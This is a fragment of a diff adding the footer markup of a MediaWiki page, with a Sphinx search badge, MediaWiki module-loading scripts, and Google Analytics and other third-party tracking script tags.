+															<a href="http://www.mediawiki.org/wiki/Extension:SphinxSearch"><img src="extensions/SphinxSearch/skins/images/Powered_by_sphinx.png" alt="Search Powered by Sphinx" width="88" height="31" /></a>
+													</li>
+									</ul>
+						<div style="clear:both"></div>
+		</div>
+		<script>if(window.jQuery)jQuery.ready();</script><script>if(window.mw){
+mw.loader.state({"site":"loading","user":"ready","user.groups":"ready"});
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.toc","mediawiki.action.view.postEdit","mediawiki.user","mediawiki.hidpi","mediawiki.page.ready","mediawiki.searchSuggest"],null,true);
+}</script>
+<script>if(window.mw){
+document.write("\u003Cscript src=\"https://wiki.deimos.fr/load.php?debug=false\u0026amp;lang=en\u0026amp;modules=site\u0026amp;only=scripts\u0026amp;skin=vector\u0026amp;*\"\u003E\u003C/script\u003E");
+}</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-63927289-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<script type="text/javascript" src="https://analytics.example.com/tracking.js"></script><script src="https://js.reactk.com/script/reactk.min.js"></script><script type="text/javascript">reactk.init("B7stJmobgweRBoDZrLflNQpDcgFxET");</script> 
+<script>if(window.mw){
+mw.config.set({"wgBackendResponseTime":65});
+}</script>
+	</body>
+</html>
+	
